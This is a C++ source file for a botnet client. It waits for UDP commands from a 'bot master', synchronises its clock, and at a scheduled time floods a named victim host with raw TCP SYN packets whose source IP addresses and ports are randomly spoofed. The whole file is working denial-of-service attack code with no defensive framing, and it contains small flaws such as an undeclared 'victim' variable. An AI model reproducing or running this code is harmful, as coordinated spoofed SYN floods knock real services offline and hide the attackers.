#include <unistd.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <math.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/time.h>
#include <fstream>
#include <netdb.h>
#include "BotProtocol.h"

using namespace std;

#define RANDOM_SPOOFING 1

static int seed = 0xA0000000;

static int botNo;
static int offset;
// 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 

unsigned short csum(unsigned short *,int);
void parseCommand(char []);
void synAttack(string, int, string, int, int);

void getOffset(){
  double foffset;
  char line[256];
  char fileName[256];
  sprintf(fileName,"bot%d_offset",botNo);
  ifstream myfile (fileName);
  if (myfile.is_open())
  {
     myfile.getline(line,256);
     cout << line << '\n';
     foffset = atof(line);
     offset = round(foffset * 1000000);
     myfile.close();
  }
  else cout << "Unable to open file"; 
}

sync_time_t get_current_time(){
    char cBuffer[100];
    time_t zaman;
    struct tm *ltime;
    static struct timeval _t;
    static struct timezone tz;
    int secCnt = 0;

    time(&zaman);
    ltime = (struct tm *) localtime(&zaman);
    gettimeofday(&_t, &tz);

    strftime(cBuffer,40,"%d.%m.%y %H:%M:%S",ltime);
    sprintf(cBuffer, "%s.%d", cBuffer,(int)_t.tv_usec);
    printf("current time %s \n",cBuffer);

    sync_time_t retval;
    retval.sec= ltime->tm_hour * 3600 + ltime->tm_min * 60 + ltime->tm_sec;
    retval.usec = (int)_t.tv_usec;
    return retval;
}
int print_time(){
    get_current_time();
    usleep(1000);
    get_current_time();
}
void getBotNo(){
    char hostname[1024];
    hostname[1023] = '\0';
    gethostname(hostname, 1023);
    cout << "Host name:" << hostname << endl;
    botNo = hostname[3] - 48;
}
void waitUntilTargettime(char* time){
    int hr,min,sec,usec;
    
    sync_time_t target;
    int wait_usec;
    cout << time << endl;
    hr  = (time[0] - 48) * 10 + time[1] - 48;
    min = (time[3] - 48) * 10 + time[4] - 48;
    sec = (time[6] - 48) * 10 + time[7] - 48;
    usec= (time[9] - 48)  * 100000 + (time[10] - 48) * 10000 + (time[11] - 48) * 1000
        + (time[12] - 48) * 100    + (time[13] - 48) * 10    + (time[14] - 48);
    cout << "parse time " << hr << ":" << min << ":" << sec << "." <<usec << endl;
    target.sec  = hr*3600 + min *60 + sec;
    target.usec = usec;
    sync_time_t now = get_current_time();
    wait_usec = (target.sec - now.sec) * 1000000 + target.usec - now.usec + offset;
    cout << "Start waiting for " << wait_usec << " usec." << endl;
    usleep(wait_usec);
}
int main(void)
{
	
	char messageBuffer[1024];
	int messageBufferSize = sizeof(messageBuffer);
	int UDPSocket;     // Socket connected to UDP;
	int UDPPort; 

    
    getBotNo();
    UDPPort= botsPort[botNo-1];  // UPD port used to reveive the command from bot master;
    print_time();
	cout << "Bot "<< botNo << " started" << endl << endl;	

	// Create a UDP socket to receive the commands from bot master;
	cout << "Preparing socket UDPSocket with port <" << UDPPort << ">...";
	UDPSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (UDPSocket < 0) {
		cout << "Error at socket()" << endl;
		return 0;
	}
	sockaddr_in UDPAddr;
	UDPAddr.sin_family = AF_INET;
	UDPAddr.sin_port = htons(UDPPort);
	UDPAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	bind(UDPSocket, (sockaddr *) &UDPAddr, sizeof(UDPAddr));  // Bind the socket to the port;
	cout << "Done" << endl << endl;
	
	// Infinite loop to receive the command from bot master
	while (1)
	{
		// Waiting for the UDP packet to receive;
		cout << "Waiting for the command from bot master..." << endl;
		memset(messageBuffer, 0, messageBufferSize);  // Empty the Buffer;
		recv(UDPSocket, messageBuffer, messageBufferSize, 0);

		// Parse the command;
		parseCommand(messageBuffer);
	}

	// Close all the socket;
	close(UDPSocket);

	return 0;
}

void parseCommand(char command[])
{
	cout << "Command received: [" << command << "]"<< endl;

    if (command[0] == '1')
    {
        cout << "Time syncronizing..." << endl;
        // Time syncronize coding;
        char cmd[256];
        sprintf(cmd,"python ntp_client.py > bot%d_offset;", botNo);
        cout << "Run shell command:" << endl << cmd << endl;
        system(cmd);
        getOffset();
        cout << "Done" << endl;
    }
    else if (command[0] == '2')
    {
        struct hostent *hostinfo = NULL; //Host name
        char victim_ip[256];
        cout << command << endl;
        waitUntilTargettime(command+15);
        hostinfo = gethostbyname(victim);
        sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
        cout << victim_ip << endl;
        
        string ss="";
        int port = 0;
        /*int p1=rand()%256;
        int p2=rand()%256;
        int p3=rand()%256;
        int p4=rand()%256;
        int port=rand()%65536;*/
        //string ss=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
        synAttack(ss, port, victim_ip, 80, 3);
        //synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
        cout << "Done" << endl;
    }
    else
        cout << "Wrong command!" << endl;
    cout << endl;
}


// Generic checksum calculation function
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int durTime)
{
	// Create a raw socket;
    
    srand(time(NULL));
    if (RANDOM_SPOOFING==0) {
        seed+=4;
        int p1=seed%256;
        int p2=(seed>>8)%256;
        int p3=(seed>>16)%256;
        int p4=(seed>>24)%256;
        sourcePort=rand()%65536;
        sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);

    }else{
    
        int p1=rand()%256;
        int p2=rand()%256;
        int p3=rand()%256;
        int p4=rand()%256;
        sourcePort=rand()%65536;
        sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
    
    }
    
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	if(s == -1)
    {
        //socket creation failed, may be because of non-root privileges
        cout << "Error at socket(), sudo !!" << endl;
		return;
    }

    // Datagram to represent the packet;
    char datagram[4096];
    char source_ip[32];
    char *data;
    char *pseudogram;

    // Initialize the packet buffer with 0;
    memset(datagram, 0, 4096);

    // IP header
    struct iphdr *iph = (struct iphdr *)datagram;

    // TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    // Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    strcpy(data, "ABCDEFGHIJKLMNOPQRSTUVWXYZ");

    // Some address resoluition;
    strcpy(source_ip, sourceIP.c_str());  // Source IP
    sin.sin_family = AF_INET;
    sin.sin_port = htons(destPort);  // Destination port
    sin.sin_addr.s_addr = inet_addr(destIP.c_str()); // Destination IP

    // Fill in the IP Header;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
    iph->id = htonl(54321);  // Id of this packet;
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(source_ip);
    iph->daddr = sin.sin_addr.s_addr;

    // IP checksum;
    iph->check = csum((unsigned short*)datagram, iph->tot_len);

    // TCP Header;
    tcph->source = htons(sourcePort);  // Source port;
    tcph->dest = htons(destPort);  // Destination port;
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;    // TCP header size;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);  // Maximum allowed window size;
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Pseudo header;
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = (char*)malloc(psize);
     
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    
    // TCP checksum;
    tcph->check = csum( (unsigned short*) pseudogram , psize);

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;

    if  (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
    	cout << "Error in setting IP_HDRINCL" << endl;
    	return;
    }

    // SYN flood;
    time_t timeBegin = time(NULL);
    while (1)
    {
    	// Send the packet;
    	if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    	{
    		cout << "sendto failed!" << endl;
    	}
    	else
    	{
    		cout << "Packet sent!  Length : " << iph->tot_len << endl;
    	}

    	if (time(NULL) - timeBegin > durTime)
            break;
    }
}
